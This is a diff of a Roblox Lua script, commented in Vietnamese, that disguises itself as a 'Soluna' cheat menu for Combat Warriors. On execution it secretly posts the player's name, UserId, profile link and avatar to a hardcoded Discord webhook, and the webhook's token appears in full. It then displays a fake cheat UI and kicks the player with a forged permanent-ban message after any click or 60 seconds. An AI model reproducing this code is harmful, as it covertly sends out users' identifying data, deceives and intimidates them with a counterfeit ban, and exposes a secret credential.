@@ -1,10 +1,19 @@
+--[[  Fake Soluna UI + Trap + 60s Countdown
+     • Khi execute: gửi log ngay + hiện UI + bắt đầu đếm 60s
+     • Trong 60s: bấm bất kỳ nút nào -> kick ngay
+     • Hết 60s mà chưa bấm -> auto kick
+--]]
+
+-- // Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
+-- // Webhook Discord (bạn đã cung cấp)
 local webhookUrl = "https://discord.com/api/webhooks/1259819377864478760/RS0hEyFNE2kEEmHnGrfJh9QNEdsxY7jJTKj1UVRnBy_yOJTx0l9LEc6uuJZag1nIvpw"
 
+-- // Ban message gốc
 local banMessage = [[
 You have been banned from Combat Warriors
 Duration: Permanent
@@ -18,41 +27,47 @@ IMPORTANT: Appeals made after 30 days of the ban date will not be accepted
 You currently have 0 previous ban(s). Repeated bans will be longer or permanent.
 ]]
 
+-- // Profile & avatar
 local profileUrl = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 local avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=180&height=180&format=png"
 local avatarFullbody = "https://www.roblox.com/outfit-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
+-- // Gửi log ngay khi execute
 local function sendWebhook()
-local data = {
-["username"] = "bắt hack 1800",
-["embeds"] = {{
-["title"] = "🚨 Phát hiện script bị execute",
-["description"] = "Người chơi: " .. player.Name ..
-"\nUserId: [" .. player.UserId .. "](" .. profileUrl .. ")" ..
-"\nThời gian: " .. os.date("!%Y-%m-%d %H:%M:%S UTC"),
-["color"] = 15158332,
-["thumbnail"] = { ["url"] = avatarHeadshot },
-["image"] = { ["url"] = avatarFullbody }
-}}
-}
-local json = HttpService:JSONEncode(data)
-local req = syn and syn.request or http_request or request
-if req then
-pcall(function()
-req({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json })
-end)
-else
-warn("Exploit không hỗ trợ HTTP request API")
-end
+    local data = {
+        ["username"] = "bắt hack 1800",
+        ["embeds"] = {{
+            ["title"] = "🚨 Phát hiện script bị execute",
+            ["description"] = "**Người chơi:** " .. player.Name ..
+                "\n**UserId:** [" .. player.UserId .. "](" .. profileUrl .. ")" ..
+                "\n**Thời gian:** " .. os.date("!%Y-%m-%d %H:%M:%S UTC"),
+            ["color"] = 15158332,
+            ["thumbnail"] = { ["url"] = avatarHeadshot },
+            ["image"] = { ["url"] = avatarFullbody }
+        }}
+    }
+    local json = HttpService:JSONEncode(data)
+    local req = syn and syn.request or http_request or request
+    if req then
+        pcall(function()
+            req({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json })
+        end)
+    else
+        warn("Exploit không hỗ trợ HTTP request API")
+    end
 end
 
-sendWebhook()
+sendWebhook() -- gửi log ngay
 
+-- ======================================================
+-- UI: Fake Soluna-style
+-- ======================================================
 local gui = Instance.new("ScreenGui")
 gui.Name = "FakeSolunaUI"
 gui.ResetOnSpawn = false
 gui.Parent = game.CoreGui
 
+-- Main window
 local main = Instance.new("Frame", gui)
 main.Size = UDim2.new(0, 560, 0, 360)
 main.Position = UDim2.new(0.5, -280, 0.5, -180)
@@ -62,6 +77,7 @@ main.ClipsDescendants = true
 local cMain = Instance.new("UICorner", main) cMain.CornerRadius = UDim.new(0,16)
 local sMain = Instance.new("UIStroke", main) sMain.Color = Color3.fromRGB(50,50,50) sMain.Thickness = 2
 
+-- Top bar with title
 local top = Instance.new("Frame", main)
 top.Size = UDim2.new(1, 0, 0, 42)
 top.BackgroundColor3 = Color3.fromRGB(32,32,36)
@@ -78,6 +94,7 @@ title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235,235,238)
 title.Text = "Soluna | Combat Warriors"
 
+-- Sidebar
 local side = Instance.new("Frame", main)
 side.Size = UDim2.new(0, 140, 1, -50)
 side.Position = UDim2.new(0, 10, 0, 50)
@@ -91,6 +108,7 @@ sideList.SortOrder = Enum.SortOrder.LayoutOrder
 sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 sideList.VerticalAlignment = Enum.VerticalAlignment.Top
 
+-- Content
 local content = Instance.new("Frame", main)
 content.Size = UDim2.new(1, -170, 1, -60)
 content.Position = UDim2.new(0, 160, 0, 60)
@@ -104,74 +122,80 @@ contList.SortOrder = Enum.SortOrder.LayoutOrder
 contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 contList.VerticalAlignment = Enum.VerticalAlignment.Top
 
+-- Helper: tạo nút đẹp
 local function makeButton(parent, text)
-local btn = Instance.new("TextButton")
-btn.Parent = parent
-btn.Size = UDim2.new(1, -24, 0, 40)
-btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
-btn.Text = "  " .. text
-btn.TextColor3 = Color3.fromRGB(235,235,238)
-btn.TextXAlignment = Enum.TextXAlignment.Left
-btn.Font = Enum.Font.Gotham
-btn.TextSize = 16
-btn.AutoButtonColor = false
+    local btn = Instance.new("TextButton")
+    btn.Parent = parent
+    btn.Size = UDim2.new(1, -24, 0, 40)
+    btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
+    btn.Text = "  " .. text
+    btn.TextColor3 = Color3.fromRGB(235,235,238)
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.Font = Enum.Font.Gotham
+    btn.TextSize = 16
+    btn.AutoButtonColor = false
 
-local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)    
-local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1    
+    local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)
+    local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1
 
-btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)    
-btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)    
+    -- hover effect
+    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
+    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)
 
-return btn
-
+    return btn
 end
 
+-- Nút sidebar
 local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
 local allButtons = {}
 
 for _, name in ipairs(sideTabs) do
-local b = makeButton(side, name)
-table.insert(allButtons, b)
+    local b = makeButton(side, name)
+    table.insert(allButtons, b)
 end
 
+-- Các option trong Content (tab Player)
 local options = {
-"Teleport",
-"Infinite Stamina",
-"No Fall Damage",
-"Noclip [BETA]",
-"Disable Utilities Damage",
-"Anti-Ragdoll"
+    "Teleport",
+    "Infinite Stamina",
+    "No Fall Damage",
+    "Noclip [BETA]",
+    "Disable Utilities Damage",
+    "Anti-Ragdoll"
 }
 for _, name in ipairs(options) do
-local b = makeButton(content, name)
-table.insert(allButtons, b)
+    local b = makeButton(content, name)
+    table.insert(allButtons, b)
 end
 
+-- ======================================================
+-- Countdown 60s + Trap click (không hiển thị text)
+-- ======================================================
 local COUNTDOWN = 60
 local start = os.clock()
 local kicked = false
 
+-- Bấm bất kỳ nút nào trong thời gian đếm -> kick ngay
 local function onAnyButtonClicked()
-if kicked then return end
-kicked = true
-player:Kick(banMessage)
+    if kicked then return end
+    kicked = true
+    player:Kick(banMessage)
 end
 
 for _, b in ipairs(allButtons) do
-b.MouseButton1Click:Connect(onAnyButtonClicked)
+    b.MouseButton1Click:Connect(onAnyButtonClicked)
 end
 
+-- Tự kick khi hết countdown (không hiển thị)
 task.spawn(function()
-while not kicked do
-local elapsed = math.floor(os.clock() - start)
-local remain = math.max(0, COUNTDOWN - elapsed)
-if remain <= 0 then
-kicked = true
-player:Kick(banMessage)
-break
-end
-task.wait(1)
-end
+    while not kicked do
+        local elapsed = math.floor(os.clock() - start)
+        local remain = math.max(0, COUNTDOWN - elapsed)
+        if remain <= 0 then
+            kicked = true
+            player:Kick(banMessage)
+            break
+        end
+        task.wait(1)
+    end
 end)
-
-
